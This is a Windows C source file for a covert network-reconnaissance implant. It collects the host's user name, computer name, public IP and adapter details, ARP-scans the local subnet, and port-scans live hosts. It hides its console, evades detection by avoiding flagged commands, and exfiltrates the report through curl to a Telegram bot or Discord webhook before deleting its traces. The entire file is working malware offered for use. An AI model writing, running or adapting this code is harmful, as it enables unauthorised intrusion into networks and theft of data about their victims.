/*
 * net_scan.c — Network scanner + port scanner
 *
 * HOW IT WORKS:
 * 1. Gets local adapter info (IP, subnet, gateway, MAC, DNS)
 * 2. ARP scans the local /24 to find live hosts
 * 3. TCP connect scans common ports on each live host
 * 4. Sends results to Telegram/Discord
 *
 * Uses native Windows APIs:
 * - iphlpapi.lib for adapter info and ARP
 * - ws2_32.lib for TCP port scanning
 * - No nmap, no PowerShell, no flagged commands
 *
 * Compile: python build.py scan --telegram --token X --chat Y
 */

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG — Set via compiler flags:
//   /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
//   /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK ""
#endif

// Common ports to scan
int SCAN_PORTS[] = {
    21,    // FTP
    22,    // SSH
    23,    // Telnet
    25,    // SMTP
    53,    // DNS
    80,    // HTTP
    110,   // POP3
    135,   // MSRPC
    139,   // NetBIOS
    143,   // IMAP
    443,   // HTTPS
    445,   // SMB
    993,   // IMAPS
    995,   // POP3S
    1433,  // MSSQL
    1723,  // PPTP VPN
    3306,  // MySQL
    3389,  // RDP
    5432,  // PostgreSQL
    5900,  // VNC
    8080,  // HTTP Alt
    8443,  // HTTPS Alt
    8888,  // HTTP Alt
    9090,  // Web admin
    0      // Sentinel
};

const char* port_service(int port) {
    switch(port) {
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "Telnet";
        case 25: return "SMTP";
        case 53: return "DNS";
        case 80: return "HTTP";
        case 110: return "POP3";
        case 135: return "MSRPC";
        case 139: return "NetBIOS";
        case 143: return "IMAP";
        case 443: return "HTTPS";
        case 445: return "SMB";
        case 993: return "IMAPS";
        case 995: return "POP3S";
        case 1433: return "MSSQL";
        case 1723: return "VPN";
        case 3306: return "MySQL";
        case 3389: return "RDP";
        case 5432: return "PostgreSQL";
        case 5900: return "VNC";
        case 8080: return "HTTP-Alt";
        case 8443: return "HTTPS-Alt";
        case 8888: return "HTTP-Alt2";
        case 9090: return "WebAdmin";
        default: return "Unknown";
    }
}

// Machine info
static char g_caption[512] = {0};

void init_info() {
    if (g_caption[0] != 0) return;
    char compName[256], userName[256], pubIP[64] = {0}, privIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH]; snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    snprintf(g_caption, sizeof(g_caption), "NetScan_%s@%s [%s]", userName, compName, pubIP);
}

void send_file(const char *filepath) {
    init_info();
    char cmd[2048];
#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_caption);
#endif
#ifdef USE_DISCORD
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_caption);
#endif
    system(cmd);
}

// ── Get Local Network Info ──

void get_adapter_info(FILE *fp) {
    ULONG bufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufLen);

    DWORD result = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_INCLUDE_GATEWAYS,
                                         NULL, pAddresses, &bufLen);
    if (result == ERROR_BUFFER_OVERFLOW) {
        free(pAddresses);
        pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufLen);
        result = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_INCLUDE_GATEWAYS,
                                       NULL, pAddresses, &bufLen);
    }

    if (result != NO_ERROR) {
        fprintf(fp, "Error getting adapter info: %lu\n", result);
        free(pAddresses);
        return;
    }

    PIP_ADAPTER_ADDRESSES pCurr = pAddresses;
    while (pCurr) {
        if (pCurr->OperStatus == IfOperStatusUp && pCurr->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
            // Adapter name
            fprintf(fp, "\nAdapter: %S\n", pCurr->FriendlyName);
            fprintf(fp, "  Description: %S\n", pCurr->Description);

            // MAC address
            if (pCurr->PhysicalAddressLength > 0) {
                fprintf(fp, "  MAC: ");
                for (DWORD i = 0; i < pCurr->PhysicalAddressLength; i++) {
                    fprintf(fp, "%02X%s", pCurr->PhysicalAddress[i],
                        i < pCurr->PhysicalAddressLength - 1 ? ":" : "");
                }
                fprintf(fp, "\n");
            }

            // IP addresses
            PIP_ADAPTER_UNICAST_ADDRESS pUni = pCurr->FirstUnicastAddress;
            while (pUni) {
                struct sockaddr_in *sa = (struct sockaddr_in*)pUni->Address.lpSockaddr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
                fprintf(fp, "  IP: %s/%d\n", ip, pUni->OnLinkPrefixLength);
                pUni = pUni->Next;
            }

            // Gateway
            PIP_ADAPTER_GATEWAY_ADDRESS_LH pGw = pCurr->FirstGatewayAddress;
            while (pGw) {
                struct sockaddr_in *sa = (struct sockaddr_in*)pGw->Address.lpSockaddr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
                fprintf(fp, "  Gateway: %s\n", ip);
                pGw = pGw->Next;
            }

            // DNS servers
            PIP_ADAPTER_DNS_SERVER_ADDRESS pDns = pCurr->FirstDnsServerAddress;
            while (pDns) {
                struct sockaddr_in *sa = (struct sockaddr_in*)pDns->Address.lpSockaddr;
                if (sa->sin_family == AF_INET) {
                    char ip[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
                    fprintf(fp, "  DNS: %s\n", ip);
                }
                pDns = pDns->Next;
            }
        }
        pCurr = pCurr->Next;
    }
    free(pAddresses);
}

// ── Get local IP and subnet base ──

int get_local_subnet(char *base_ip, int base_size, char *local_ip, int local_size) {
    ULONG bufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufLen);
    GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &bufLen);

    PIP_ADAPTER_ADDRESSES pCurr = pAddresses;
    while (pCurr) {
        if (pCurr->OperStatus == IfOperStatusUp && pCurr->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
            PIP_ADAPTER_UNICAST_ADDRESS pUni = pCurr->FirstUnicastAddress;
            if (pUni) {
                struct sockaddr_in *sa = (struct sockaddr_in*)pUni->Address.lpSockaddr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
                strncpy(local_ip, ip, local_size - 1);

                // Get /24 base
                unsigned long addr = ntohl(sa->sin_addr.s_addr);
                addr &= 0xFFFFFF00;  // Mask to /24
                struct in_addr base;
                base.s_addr = htonl(addr);
                inet_ntop(AF_INET, &base, base_ip, base_size);

                free(pAddresses);
                return 1;
            }
        }
        pCurr = pCurr->Next;
    }
    free(pAddresses);
    return 0;
}

// ── ARP Scan — Find live hosts on /24 ──

typedef struct {
    char ip[16];
    char mac[18];
} HostEntry;

// Thread-safe ARP scan results
static HostEntry g_hosts[256];
static volatile LONG g_found = 0;
static unsigned long g_base_addr = 0;

DWORD WINAPI arp_thread(LPVOID param) {
    int i = (int)(intptr_t)param;
    struct in_addr target;
    target.s_addr = htonl(g_base_addr + i);

    ULONG macAddr[2];
    ULONG macLen = 6;
    DWORD ret = SendARP(target.s_addr, 0, macAddr, &macLen);

    if (ret == NO_ERROR && macLen > 0) {
        LONG idx = InterlockedIncrement(&g_found) - 1;
        if (idx < 256) {
            BYTE *mac = (BYTE*)macAddr;
            inet_ntop(AF_INET, &target, g_hosts[idx].ip, 16);
            snprintf(g_hosts[idx].mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        }
    }
    return 0;
}

int arp_scan(const char *base_ip, HostEntry *hosts, int max_hosts) {
    unsigned long addr;
    inet_pton(AF_INET, base_ip, &addr);
    g_base_addr = ntohl(addr);
    g_found = 0;

    // Launch threads in batches of 50 (WaitForMultipleObjects max is 64)
    HANDLE threads[50];
    for (int batch = 0; batch < 254; batch += 50) {
        int count = 50;
        if (batch + count > 254) count = 254 - batch;

        for (int i = 0; i < count; i++) {
            threads[i] = CreateThread(NULL, 0, arp_thread,
                (LPVOID)(intptr_t)(batch + i + 1), 0, NULL);
        }
        WaitForMultipleObjects(count, threads, TRUE, 5000);
        for (int i = 0; i < count; i++) {
            CloseHandle(threads[i]);
        }
    }

    // Copy results
    int count = (int)g_found;
    if (count > max_hosts) count = max_hosts;
    memcpy(hosts, g_hosts, count * sizeof(HostEntry));
    return count;
}

// ── TCP Port Scan — Non-blocking connect with timeout ──

int scan_port(const char *ip, int port, int timeout_ms) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return 0;

    // Set non-blocking
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    // Wait for connection with timeout
    fd_set writefds;
    FD_ZERO(&writefds);
    FD_SET(sock, &writefds);

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    int result = select(0, NULL, &writefds, NULL, &tv);

    closesocket(sock);

    return (result > 0) ? 1 : 0;
}

void scan_host_ports(const char *ip, FILE *fp) {
    int open_count = 0;
    for (int i = 0; SCAN_PORTS[i] != 0; i++) {
        if (scan_port(ip, SCAN_PORTS[i], 200)) {  // 200ms timeout per port
            fprintf(fp, "    Port %-5d OPEN  (%s)\n", SCAN_PORTS[i], port_service(SCAN_PORTS[i]));
            open_count++;
        }
    }
    if (open_count == 0) {
        fprintf(fp, "    No common ports open\n");
    }
}

// ── Main ──

int main(int argc, char *argv[]) {
    // Check for --deep flag
    int deep_scan = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--deep") == 0) deep_scan = 1;
    }

    // Hide console unless --debug
    int debug = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0) debug = 1;
    }
    if (!debug) {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
    }

    // Init Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%sns.txt", tempPath);

    FILE *fp = fopen(outFile, "w");
    if (!fp) { WSACleanup(); return 1; }

    char compName[256], userName[256];
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    fprintf(fp, "=== Network Scan ===\n");
    fprintf(fp, "Computer: %s\nUser: %s\n", compName, userName);

    // Local adapter info
    fprintf(fp, "\n--- Adapter Info ---\n");
    get_adapter_info(fp);

    // Get local subnet
    char base_ip[16], local_ip[16];
    if (!get_local_subnet(base_ip, sizeof(base_ip), local_ip, sizeof(local_ip))) {
        fprintf(fp, "\nError: Could not determine local subnet\n");
        fclose(fp);
        send_file(outFile);
        DeleteFileA(outFile);
        WSACleanup();
        return 1;
    }

    fprintf(fp, "\n--- ARP Scan: %s/24 ---\n", base_ip);
    fprintf(fp, "Local IP: %s\n\n", local_ip);

    if (debug) printf("Scanning %s.0/24...\n", base_ip);

    // ARP scan
    HostEntry hosts[256];
    int host_count = arp_scan(base_ip, hosts, 256);

    if (debug) printf("Found %d hosts, scanning ports...\n", host_count);

    fprintf(fp, "Mode: %s\n", deep_scan ? "DEEP" : "QUICK");
    fprintf(fp, "Found %d live hosts:\n\n", host_count);

    int quick_ports[] = {22, 80, 443, 445, 3389, 8080, 0};

    for (int i = 0; i < host_count; i++) {
        fprintf(fp, "  %-15s  MAC: %s", hosts[i].ip, hosts[i].mac);
        if (deep_scan) {
            // Deep mode: port scan each host
            fprintf(fp, "\n");
            for (int p = 0; quick_ports[p] != 0; p++) {
                if (scan_port(hosts[i].ip, quick_ports[p], 100)) {
                    fprintf(fp, "    Port %-5d OPEN (%s)\n", quick_ports[p], port_service(quick_ports[p]));
                }
            }
        } else {
            fprintf(fp, "\n");
        }
    }

    // Always scan localhost ports
    fprintf(fp, "\n--- Local Machine Ports ---\n");
    for (int p = 0; quick_ports[p] != 0; p++) {
        if (scan_port("127.0.0.1", quick_ports[p], 100)) {
            fprintf(fp, "  Port %-5d OPEN (%s)\n", quick_ports[p], port_service(quick_ports[p]));
        }
    }

    fclose(fp);

    if (debug) printf("Sending to exfil channel...\n");

    // Send to Telegram/Discord
    send_file(outFile);

    if (debug) printf("Done.\n");

    // Cleanup
    DeleteFileA(outFile);
    WSACleanup();

    return 0;
}
